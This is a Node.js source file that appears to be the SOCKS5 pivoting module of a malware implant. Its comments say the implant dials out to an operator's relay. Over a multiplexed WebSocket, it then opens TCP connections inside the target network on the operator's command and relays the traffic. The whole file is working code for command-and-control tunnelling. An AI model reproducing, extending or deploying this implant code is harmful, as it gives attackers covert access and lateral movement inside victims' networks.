// socks.js — agent side of the tunnel mux (the implant DIALS, the relay hosts).
//
// The relay terminates the operator's SOCKS5 clients (RFC1928) and maps every
// CONNECT to an OPEN frame on the persistent WS channel; the implant makes the
// real TCP connection from inside the target network and shuttles bytes back.
// Many connections are multiplexed over the single WS with u16 connIds —
// one TCP connection, thousands of pivoted sockets, zero extra HTTP.
//
// Tunnel frame codes (payload layouts):
//   0 OPEN_REQ   relay->agent  data = "host:port" (SOCKS5 CONNECT target)
//   1 DATA       both          data = raw stream bytes
//   2 CLOSE      both          data empty
//   3 OPEN_OK    agent->relay  data empty
//   4 OPEN_FAIL  agent->relay  data = reason string (errno-ish)
const net = require('net');

const CODE_OPEN_REQ = 0;
const CODE_DATA = 1;
const CODE_CLOSE = 2;
const CODE_OPEN_OK = 3;
const CODE_OPEN_FAIL = 4;

const HIGH_WATER = 1 << 20;  // pause the local socket when the WS backlog exceeds 1MB
const LOW_WATER = 256 << 10; // resume below 256KB

// sendTunnel(connId, code, data) — wired to wslink.sendTunnel by agent.js
function createTunnels(sendTunnel, opts) {
  const log = opts.log || (() => {});
  const backlog = opts.backlog || (() => 0);
  const conns = new Map(); // connId -> net.Socket
  let resumeTimer = null;

  function pumpDrain() {
    if (resumeTimer) return;
    resumeTimer = setInterval(() => {
      const low = backlog() < LOW_WATER;
      let any = false;
      for (const sock of conns.values()) {
        if (low && sock.isPaused && sock.isPaused()) { try { sock.resume(); } catch (_) {} any = true; }
      }
      if (low || conns.size === 0) { clearInterval(resumeTimer); resumeTimer = null; }
    }, 25);
  }

  function sockData(connId, sock, chunk) {
    sendTunnel(connId, CODE_DATA, chunk);
    if (backlog() > HIGH_WATER) { try { sock.pause(); pumpDrain(); } catch (_) {} }
  }

  function handleFrame(code, connId, data) {
    if (code === CODE_OPEN_REQ) {
      const target = data.toString('utf8');
      const sep = target.lastIndexOf(':');
      if (sep < 1) { sendTunnel(connId, CODE_OPEN_FAIL, Buffer.from('bad target')); return; }
      const host = target.slice(0, sep);
      const port = parseInt(target.slice(sep + 1), 10);
      if (!port || port < 1 || port > 65535) { sendTunnel(connId, CODE_OPEN_FAIL, Buffer.from('bad port')); return; }
      const sock = net.connect({ host, port });
      sock.setTimeout(8000, () => {
        if (!conns.has(connId)) { sock.destroy(); sendTunnel(connId, CODE_OPEN_FAIL, Buffer.from('ETIMEDOUT')); }
      });
      sock.once('connect', () => {
        sock.setTimeout(0);
        conns.set(connId, sock);
        sendTunnel(connId, CODE_OPEN_OK);
        log(`[socks] ${connId}: OPEN ${host}:${port}`);
      });
      sock.once('error', (e) => {
        if (!conns.has(connId)) sendTunnel(connId, CODE_OPEN_FAIL, Buffer.from(e.code || e.message || 'error'));
        else log(`[-] socks ${connId}: ${e.code || e.message}`);
        try { sock.destroy(); } catch (_) {}
      });
      sock.on('data', (chunk) => { if (conns.has(connId)) sockData(connId, sock, chunk); });
      sock.once('close', () => {
        if (conns.delete(connId)) { sendTunnel(connId, CODE_CLOSE); log(`[socks] ${connId}: CLOSE`); }
      });
      return;
    }

    const sock = conns.get(connId);
    if (code === CODE_DATA) {
      if (sock) { try { sock.write(data); } catch (_) {} } // relay peer died mid-stream: drop silently
      return;
    }
    if (code === CODE_CLOSE) {
      if (sock) { conns.delete(connId); try { sock.destroy(); } catch (_) {} log(`[socks] ${connId}: relay closed`); }
      return;
    }
  }

  function closeAll() {
    for (const sock of conns.values()) { try { sock.destroy(); } catch (_) {} }
    conns.clear();
    if (resumeTimer) { clearInterval(resumeTimer); resumeTimer = null; }
  }

  return { handleFrame, closeAll, count: () => conns.size };
}

module.exports = { createTunnels, CODE_OPEN_REQ, CODE_DATA, CODE_CLOSE, CODE_OPEN_OK, CODE_OPEN_FAIL };
